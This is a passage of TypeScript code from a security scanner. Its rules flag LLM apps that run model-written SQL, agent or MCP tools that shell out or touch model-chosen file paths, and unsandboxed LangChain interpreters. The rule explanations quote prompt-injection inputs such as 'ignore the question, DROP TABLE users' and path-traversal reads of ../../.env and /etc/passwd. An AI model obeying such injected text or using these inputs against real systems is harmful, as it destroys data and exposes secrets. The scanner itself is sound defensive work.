    const guarded = /read[\s_-]?only|isSelectOnly|\^\\s\*select|startsWith\(\s*['"]select/i.test(cleanContent);
    const sqlIdx = guarded ? -1 : codeLines.findIndex((l) => sqlSinks.some((re) => re.test(l)));
    if (sqlIdx !== -1) {
      hits.push({
        ruleId: 28203, code: 'AI-APP-03', severity: 'HIGH', category: 'AI & LLM Security', lineIdx: sqlIdx,
        title: 'LLM-Generated SQL Executed Without Restriction',
        why: 'SQL written by the model is run directly against the database. A prompt-injected request ("ignore the question, DROP TABLE users" or "SELECT * FROM other tenants") executes with the application\'s full database privileges (OWASP LLM05).',
        fix: 'Have the model fill parameters for predefined queries instead of writing SQL. If free-form text-to-SQL is required, execute it on a read-only role scoped to the caller\'s rows (RLS) with a statement timeout and an allowlist of tables.'
      });
    }
  }

  // AI-APP-04 / AI-APP-05: agent / MCP tool handlers that act on model-chosen arguments unchecked
  const agentFramework = isPy
    ? /\b(?:from|import)\s+(?:langchain\w*|mcp|fastmcp|agents|openai|anthropic|crewai|llama_index|pydantic_ai|smolagents)\b/.test(cleanContent)
    : /(?:from\s+|require\(\s*)['"](?:ai|@ai-sdk\/[\w-]+|@modelcontextprotocol\/sdk[\w/.-]*|@langchain\/[\w/-]+|langchain[\w/-]*|@openai\/agents[\w/-]*|@anthropic-ai\/sdk[\w/-]*|@mastra\/core[\w/-]*|openai)['"]/.test(cleanContent);
  if (agentFramework) {
    const handlers = isPy ? pyToolHandlers(codeLines) : jsToolHandlers(codeLines);
    let shellHit = false;
    let fsHit = false;
    for (const h of handlers) {
      const bodyText = h.body.join('\n');
      const params = h.params.filter((p) => !new RegExp(String.raw`\b${escapeRe(p)}\s*:\s*z\.(?:enum|literal|nativeEnum)\(`).test(h.context));
      if (!params.length) continue;
      const arg = params.map((p) => String.raw`\b${escapeRe(p)}\b`).join('|');
      if (!shellHit && !/needsApproval|requireApproval|ALLOWED_|allowlist|allowedCommands|whitelist|shlex\.quote|\.includes\(\s*(?:command|cmd)\b/i.test(h.context + bodyText)) {
        const sinks = codeExecSinks(arg, isPy, isPy || hasChildProcess);
        const off = h.body.findIndex((l) => sinks.some((re) => re.test(l)));
        if (off !== -1) {
          shellHit = true;
          hits.push({
            ruleId: 28204, code: 'AI-APP-04', severity: 'HIGH', category: 'AI & LLM Security', lineIdx: h.line + off,
            title: 'Agent / MCP Tool Executes Model-Supplied Shell Command or Code',
            why: 'Tool arguments are chosen by the model, and the model follows instructions found in user messages, web pages and documents. A tool that shells out or evals its argument turns any prompt injection into remote code execution (OWASP LLM06 Excessive Agency).',
            fix: 'Expose narrow tools (fixed commands with validated parameters, z.enum allowlists) instead of a generic shell, require human approval (needsApproval) for side effects, and run anything open-ended in a sandbox.'
          });
        }
      }
      const containment = /startsWith\(|path\.relative|\brelative\(|realpath|is_relative_to|commonpath|relative_to\(|basename\(|includes\(\s*['"]\.\.['"]\)|['"]\.\.['"]\s+in\b/.test(bodyText);
      if (!fsHit && !containment) {
        const sinks = fsSinks(arg, isPy);
        const off = h.body.findIndex((l) => sinks.some((re) => re.test(l)));
        if (off !== -1) {
          fsHit = true;
          hits.push({
            ruleId: 28205, code: 'AI-APP-05', severity: 'HIGH', category: 'AI & LLM Security', lineIdx: h.line + off,
            title: 'Agent / MCP Tool Reads or Writes a Model-Supplied File Path Unchecked',
            why: 'The file path comes straight from the model\'s tool call. A prompt-injected request can make the agent read ../../.env, SSH keys or other users\' files, or overwrite source and config files.',
            fix: 'Resolve the path against a fixed root and reject anything outside it (path.resolve(root, p) then check it startsWith(root + path.sep)), or accept file ids from an allowlist instead of raw paths.'
          });
        }
      }
    }
    // AI-APP-05 (MCP resources): a resource read handler maps the client-chosen URI onto the file system
    if (!fsHit && !isPy && /@modelcontextprotocol\/sdk|\bMcpServer\b/.test(cleanContent)) {
      const idx = mcpResourceFsRead(codeLines);
      if (idx !== -1) {
        hits.push({
          ruleId: 28205, code: 'AI-APP-05', severity: 'HIGH', category: 'AI & LLM Security', lineIdx: idx,
          title: 'Agent / MCP Tool Reads or Writes a Model-Supplied File Path Unchecked',
          why: 'The MCP resource handler turns the requested resource URI into a file path and reads it. The client (or a prompt-injected agent) chooses the URI, so file:///../../.env or a template variable such as ../../etc/passwd reads any file the server process can access.',
          fix: 'Resolve the path against a fixed root and reject anything outside it (path.resolve(root, p) then check it startsWith(root + path.sep)), or serve resources from an explicit allowlist of files.'
        });
      }
    }
  }

  // AI-APP-07: LangChain tools / flags that hand the model a Python or shell interpreter
  if (isPy) {
    const replIdx = codeLines.findIndex((l) => /\b(?:PythonREPLTool|PythonAstREPLTool|ShellTool)\s*\(|\bload_tools\s*\([^)]*['"](?:terminal|python_repl)['"]|\ballow_dangerous_code\s*=\s*True\b/.test(l));
    if (replIdx !== -1) {
      hits.push({
        ruleId: 28207, code: 'AI-APP-07', severity: 'HIGH', category: 'AI & LLM Security', lineIdx: replIdx,
        title: 'LangChain Agent Given an Unsandboxed Python / Shell Interpreter',
        why: 'PythonREPLTool, ShellTool, the "terminal" tool and allow_dangerous_code=True execute whatever code the model writes on the host process. Prompt injection in the question or in the analysed data becomes remote code execution.',
        fix: 'Remove the interpreter tool or run it in a disposable sandbox (container / microVM / hosted code interpreter) with no credentials, filesystem or network access to production.'
      });
    }
  }
}

export function evaluateAiAppCiRules(file: CodeFile, lines: string[], cleanContent: string, findingCounter: {
  count: number;
}): { findings: Finding[]; logs: string[] } {
  const findings: Finding[] = [];
  const logs: string[] = [];
  const path = file.path.replace(/\\/g, '/');
  if (/(?:^|\/)node_modules\//.test(path)) return { findings, logs };
  const raw = file.content || cleanContent;
  const hits: Hit[] = [];
  let reportLines: string[];

  if (/(?:^|\/)\.github\/workflows\/[^/]+\.ya?ml$/i.test(path)) {
    // YAML: use the raw file (the JS comment stripper can eat `//` inside run scripts) minus full-line # comments
    reportLines = raw.split('\n').map((l) => l.replace(/\r$/, ''));
    evaluateWorkflow(reportLines.map((l) => (/^\s*#/.test(l) ? '' : l)), hits);
  } else if (/\.(?:[cm]?[jt]sx?|py|vue|svelte|astro)$/i.test(path) && !/\.d\.ts$/i.test(path)) {
    reportLines = raw.split('\n');
    evaluateLlmApp(file, raw, cleanContent, hits);
  } else {
    return { findings, logs };
  }

  const ts = new Date().toLocaleTimeString();
  for (const h of hits) {
    const lineNum = h.lineIdx + 1;
    findings.push({
      id: `aiappci${h.ruleId}-${Date.now()}-${findingCounter.count++}`,
      ruleId: h.ruleId,
      type: 'SECURITY',
      title: `${h.code}: ${h.title}`,
      severity: h.severity,
      category: h.category,
      filePath: file.path,
      lineRange: `L${lineNum}`,
      snippet: (reportLines[h.lineIdx] || lines[h.lineIdx] || '').trim(),
      reproductionSteps: [`Scanned ${file.path}:${lineNum}.`, h.why],
      remediationPrompt: `${h.fix} (${file.path}:${lineNum})`,
      status: 'OPEN',
      owner: 'Security Lead',
      falsePositive: false
    });
    logs.push(`[${ts}] [AI-APP/GHA] ${h.severity}: ${h.code} ${h.title} at ${file.path}:${lineNum}`);
  }
  return { findings, logs };
}
